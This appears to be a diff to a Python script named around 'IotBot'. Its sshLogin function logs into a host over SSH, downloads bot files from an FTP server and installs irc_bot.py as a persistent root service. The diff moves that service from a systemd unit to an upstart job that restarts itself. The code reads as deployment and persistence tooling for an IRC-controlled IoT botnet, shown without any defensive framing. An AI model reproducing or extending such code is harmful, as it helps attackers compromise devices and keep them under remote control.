@@ -41,19 +41,18 @@ def sshLogin(user, ip, password):
         cd IotBot
         echo ''' + password + '''| sudo wget --user=user --password=abcd ftp://10.0.0.184:/IotBot/*
         
-        echo ''' + password + '''| sudo touch /etc/systemd/system/my.service
-        echo ''' + password + '''| sudo echo '[Unit]' >> /etc/systemd/system/my.service
-        echo ''' + password + '''| sudo echo 'Description=A test unit' >> /etc/systemd/system/my.service
+        echo ''' + password + '''| sudo touch /etc/init/my.conf
+        echo ''' + password + '''| sudo echo 'Description=A test unit' >> /etc/init/my.conf
         
-        echo ''' + password + '''| sudo echo '' >> /etc/systemd/system/my.service
-        echo ''' + password + '''| sudo echo '[Service]' >> /etc/systemd/system/my.service
-        echo ''' + password + '''| sudo echo 'ExecStart=/usr/bin/python3 /home/kabali/IotBot/irc_bot.py' >> /etc/systemd/system/my.service
-        echo ''' + password + '''| sudo echo 'StandardOutput=syslog' >> /etc/systemd/system/my.service
-        echo ''' + password + '''| sudo echo 'tandardError=syslog' >> /etc/systemd/system/my.service
-        echo ''' + password + '''| sudo echo 'SyslogIdentifier=my' >> /etc/systemd/system/my.service
+        echo ''' + password + '''| sudo echo 'start on runlevel [234]' >> /etc/init/my.conf
+        echo ''' + password + '''| sudo echo 'stop on runlevel [0156]' >> /etc/init/my.conf
         
-        echo ''' + password + '''| sudo systemctl start my
-        echo ''' + password + '''| sudo systemctl status my
+        echo ''' + password + '''| sudo echo 'exec /usr/bin/python3 /home/kabali/IotBot/irc_bot.py' >> /etc/init/my.conf
+        
+        echo ''' + password + '''| sudo echo 'respawn' >> /etc/init/my.conf
+
+        echo ''' + password + '''| sudo stop my
+        echo ''' + password + '''| sudo status my 
         exit
         '''
         )
